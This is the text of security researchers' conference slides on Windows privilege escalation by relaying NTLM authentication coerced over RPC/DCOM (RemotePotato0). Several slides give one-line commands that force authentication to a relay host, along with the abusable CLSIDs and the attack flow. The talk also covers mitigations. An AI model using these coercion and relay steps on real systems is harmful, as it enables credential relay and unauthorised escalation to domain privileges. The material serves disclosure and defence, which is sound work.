Relaying to Greatness: Windows Privilege Escalation by abusing the RPC/DCOM protocols

Antonio Cocomazzi
Threat Researcher, SentinelOne

Andrea Pierini
IT Security Manager

whoami: Andrea Pierini
IT architect & security manager

Security enthusiast and independent Researcher

MSRC top #100 ranking 2020

@decoder_it https://decoder.cloud decoder.ap@gmail.com

whoami: Antonio Cocomazzi
Threat Researcher @ SentinelOne

Mainly deal with malware analysis and reverse engineering

Independent vulnerability researcher
Free time = coding offensive tools + deepin into Windows internals

@splinter_code @antonioCoco

Why this talk?
 NTLM relay attacks are usually conducted on SMB, HTTP and LDAP protocols. But what about RPC?
 The RPC protocol is used heavily internally by Windows systems for inter process communication and to support all the COM/DCOM protocol
 The majority of RPC calls are authenticated using a variety of authentication services such as Microsoft Negotiate SSP or Microsoft NT LAN Manager (NTLM)
 In case of NTLM if we are able to perform "MITM" attack, we can relay the RPC authentication
 Several DCOM/RPC triggers do not require user interaction

Agenda
Basic Concepts NTLM Relay in DCE/RPC protocol
 The RPC Trigger: Potato exploit  Cross Protocol Relay  DCOM cross session activation Demo - 3 scenarios of Privilege Escalation Mitigations Conclusion

Basic Concepts

The DCE/RPC protocol

 RPC is a distributed computing technique where a program calls a procedure to be executed in a different address space than its own.
 The procedure may be on the same system or a different system connected on a network.
 MSRPC is Microsoft implementation of RPC, heavily used
 Several network protocols can be used: TCP, UDP, Named Pipes, HTTP, SMB, ALPC (used for local Inter process communication)

Credits: @itm4n (Clément Labro)

The DCE/RPC protocol
 Client-Server model which relies on runtime libraries rpcrt4.dll
 Remote procedures are exposed via "interfaces" which are defined by the "interface definition language "(IDL) and complied with the MIDL compiler
 The endpoint mapper service (rpceptmapper) solves RPC interface identifiers to transport endpoints by returning the connection information of the server running the service (address/protocol/port)

COM/DCOM protocol

 "The Microsoft Component Object Model (COM) is a platformindependent,distributed, objectoriented system for creating binary software components that can interact"
 DCOM is a proprietary Microsoft software component that allows COM objects to communicate with each other over the network
 Many Windows services communicate using DCOM

 DCOM uses the RPC protocol to request services from COM servers over the network
 "Rpcss" service is the control manager for COM and DCOM servers
 The generic DCOM Activation mechanisms are very interesting because authentication occurs in this phases,especially when OXID resolution occurs(method that provides string bindings necessary to connect with remote objects) [1]

[1] https://github.com/tyranid/infosec-presentations/blob/master/Infiltrate/2017/COM%20in%2060%20Seconds.pdf

COM/DCOM protocol

NTLM relaying

 NTLM relay is a quite old Man in the middle attack between a client and server on the network in order intercept NTLM challenge/response authentication traffic and relay it to the desired target

 In relay attacks, the client believes it is negotiating with the target server it wants to authenticate to and server believes that the attacker is the legitimate client attempting to authenticate.

https://en.hackndo.com/ntlm-relay/
 You have to coerce a victim user/computer to authenticate
 In our case no user interaction needed, we "trigger" the authentication ;)

NTLM Relay in DCE/RPC protocol

The RPC Trigger: Potato exploit
 In recent years we made a lot of research in the so called "DCOM DCE/RPC Local NTLM Reflection"[1]
 All the potato family rely on that: Rotten/Juicy/Rogue Potato  Service -> Instant LPE to SYSTEM!  Leverages the DCOM activation service to trigger a DCOM
authentication to an arbitrary local RPC endpoint over TCP
[1] https://bugs.chromium.org/p/project-zero/issues/detail?id=325

The RPC Trigger: Potato exploit
 It abuses the standard COM marshalling  Craft a malicious OBJREF_STANDARD marshalled interface  Oxid Resolution is needed for locating the binding information of
the COM object. This needs to be authenticated.  The malicious marshalled object contains the address of an
attacker controller RPC server as the Oxid Resolver address  Use CoGetInstanceFromIStorage to convince a privileged server to
perform an authenticated Oxid Resolution. (DCOM activation)  Privileged oxid resolution occurs -> privileged authentication comes
to the attacker -> Profit!  Silently fixed in Windows 10 1809/Server 2019. We found out it
was a partial fix. Still possible to trigger an RPC authentication to a remote server. Let's see how...

The RPC Trigger: Potato exploit
https://thrysoee.dk/InsideCOM+/ch19e.htm

The RPC Trigger: Potato exploit
 CoGetInstanceFromIStorage needs a particular CLSID in order to trigger privileged DCOM authentication in the server's security context, e.g. BITS runs as SYSTEM
 Machine authentication (NETWORK SERVICE/LOCAL SYSTEM) wasn't of our interest even if an LPE could occur if combined with RBCD... [1]
 Some CLSID to the rescue! If activated from session 0:
 BrowserBroker Class {0002DF02-0000-0000-C000-000000000046}  AuthBrokerUI {0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4}  PickerHost {5167B42F-C111-47A1-ACC4-8EABE61B0B54}
 They will trigger an NTLM authentication over RPC from the user interactively logged on in lowest Session > 0 :D
[1] https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-2-windows-1020162019-lpe

The RPC Trigger: Potato exploit
 PickerHost CLSID: {5167B42F-C111-47A1-ACC4-8EABE61B0B54}
APPID = {8DF61FB6-3223-4E2D-8A92-D937DDB0DF4C}

The Rogue Oxid Resolver Server
 "OXID resolution: The process of obtaining the remote procedure call (RPC) binding information that is required to communicate with the object exporter." MSDN (think it as sort of DNS)
 MS OXID resolver is implemented through the RPC interface IObjectExporter
 It listens on port 135 with IPID (interface pointer identifier) 99fcfec4-5260-101b-bbcb-00aa0021347a
 The OXID resolution is a key step for DCOM activation and is performed in the server's security context
 Some interesting RPC methods we could abuse?

The Rogue Oxid Resolver Server

RPCSS (victim user)

Malicious Attacker

:(
Oxid Resolution sequence

The Rogue Oxid Resolver Server

RPCSS (victim user)

Malicious Attacker

Oxid Resolution sequence

RPC_C_AUTHN_LEVEL_DEFAULT RPC_C_AUTHN_LEVEL_NONE RPC_C_AUTHN_LEVEL_CONNECT RPC_C_AUTHN_LEVEL_CALL RPC_C_AUTHN_LEVEL_PKT RPC_C_AUTHN_LEVEL_PKT_INTEGRITY RPC_C_AUTHN_LEVEL_PKT_PRIVACY

The Rogue Oxid Resolver Server

RPCSS (victim user)

Malicious Attacker

Oxid Resolution sequence

RPC_C_AUTHN_GSS_NEGOTIATE RPC_C_AUTHN_WINNT RPC_C_AUTHN_GSS_SCHANNEL RPC_C_AUTHN_GSS_KERBEROS RPC_C_AUTHN_NETLOGON RPC_C_AUTHN_DEFAULT

The Rogue Oxid Resolver Server

RPCSS (victim user)

Malicious Attacker

Oxid Resolution sequence

State of the art in relaying RPC authentication

How we relay a coerced RPC client authentication?  A successful NTLM relay attack occurs in two main phases:

Coercing Authentication (client)

Mitm (vulnerable server)

 cmd /c type \\relay-node\s\file (SMB)  net use \\relay-node@80\s\file (HTTP)
 MpCmdRun.exe -Scan -ScanType 3 -File \\relaynode\s\file (SMB)
 SpoolSample (SMB)  PetitPotam (SMB)
RPC???

 File Sharing (SMB)  Directory Information Service (LDAP)  Active Directory Certificate Services (HTTP)  ITaskSchedulerService (RPC) - CVE-2020-1113 [1]  IRemoteWinSpool (RPC) - CVE-2021-1678 [2]

[1] https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/ [2] https://www.crowdstrike.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/

Cross Protocol Relay
 RPC -> RPC was not interesting. Vulnerable RPC servers are already a vulnerability
 Are RPC client authentication vulnerable to cross protocol relay? This would allow to expand this attack surface to other vulnerable scenarios
 Let's find out by implementing a minimal relay server that unpack RPC authentication and pack over HTTP
 Scenario: from a RPC connection to reading a protected file from a webserver
 [BONUS] You can coerce a "relayable" NTLM authentication over RPC without writing a single line of code ;)
rpcping.exe /s 10.0.0.35 /e 9997 /a connect /u NTLM

Cross Protocol Relay: Scenario
In: RPC  Out: HTTP Out: RPC  In: HTTP
In: RPC  Out: HTTP
https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/

Cross Protocol Relay
 RPC -> HTTP , RPC -> LDAP, RPC->SMB cross protocol relay works!
 In our final scenario we added an additional layer of relaying to use ntlmrelayx, so rpc -> http - http -> ldap
 It requires the RPC authentication level is set to RPC_AUTHN_LEVEL_CONNECT (0x2)
 We need to deal also with NTLM mitigations: SIGNING, MIC
 Only some special CLSIDs allows to unset the signing flag through the authentication provider RPC_AUTH_WINNT (0x10)

DCOM cross session activation
Getting a shell in Session 0 is not so common for a regular user
 A more common scenario: you have a Remote Desktop session with multiple users connected you could attack via «cross session».
 Select the target session of your choice and profit! ;-)
But «Session Moniker» cannot be combined with IStorage activation. No chance?

DCOM cross session activation
 "Standard Activating Yourself to Greatness" [1] a post by Forshaw (inspired by our RemotePotato0) where he demonstrates that there are some "undocumented" ways to specify the target session before triggering the IStorage object...
[1] https://www.tiraniddo.dev/2021/04/standard-activating-yourself-to.html

DCOM cross session activation
void TriggerDCOMWithSessionID(wchar_t* clsid_string){}

RemotePotato0 - the big picture

RemotePotato0:DCOM Trigger Special CLSID
Dest.session (k)

RemotePotato0:Oxid Resolver on port 9998

Domain Admin Logged in Session(k)

Shell in session (n)

Victim (x.x.x.x)

Redirector

1. ResolveOxid2 Request y.y.y:135

listening on 135
2. Forward to x.x.x.x:9998

Victim (x.x.x.x)

Attacker (y.y.y.y)
3. ResolveOxid2 response: NCACN_IP_TCP:x.x.x.x[9997]

Attacker (y.y.y.y)

4. IRemUnknown2 query x.x.x.x:[9997]

Victim (x.x.x.x)
RemotePotato0: NTLM HTTP Reflection
Listener on 9997 RPC->HTTP

5. http->http relay

ntlmrelayx HTTP server

Target Server to relay
Credentials (Smb,Ldap,
Http)

The "strange case" of SMB relay
 RPC->SMB relay works as long as signin is not enabled and NLTM "Identify flag" is not set otherwise you will get a "BAD IMPERSONATION LEVEL"
 If identify flag is set (ex: PickerHost CLSID) we can unset the flag in NTLM Type 1 Message and set it again in NTLM Type 2 Response and bypass this limitation!
 Starting from November 2020 Patch Tuesday this was no more possible
 Is seems that MIC is always checked, even if signin is not enabled!

The "strange case" of SMB relay

Before Nov. 2020 Patch

After Nov. 2020 Patch

Demo

Mitigations

Mitigations
Microsoft will not fix this issue
 MSRC case 62293 (servers have to defend themselves against NTLM relay attacks)
 NTLM is an "obsolete" and "deprecated" protocol (??)  disable NTLM - good luck :-) assign "sensitive" users to the "Protected Users" group which
will inhibit NTLM protocol for authentication  But wait!

Mitigations
Did you know? You can *also* relay Kerberos Authentication!!
By James Forshaw @tiraniddo
https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html

Mitigations
The right way:
 For HTTP(s): configure Extended Protection (CBT, service binding)  For LDAP(s): require signature for non-LDAPS connections AND channel
binding token to a minimum of "When Supported" (if not Always)  For SMB: you should always configure signing
 Use third part patching from 0patch (free) https://blog.0patch.com/2022/01/free-micropatches-forremotepotato0.html

Conclusion
NTLM is not bad, it's old -> it's not good now Do not blindly trust the multi-user security model.
Think terminal servers right now :( "Won't fix" != Without risks The old new thing:
 *potatoes and relaying are still alive and kicking ;-)

Special Thanks
James Forshaw All the *potato contributors Impacket's devs BlueHat organizers

We hope you enjoyed our talk... did you?

Thank you and feel free to reach out! :)

@decoder_it

@splinter_code

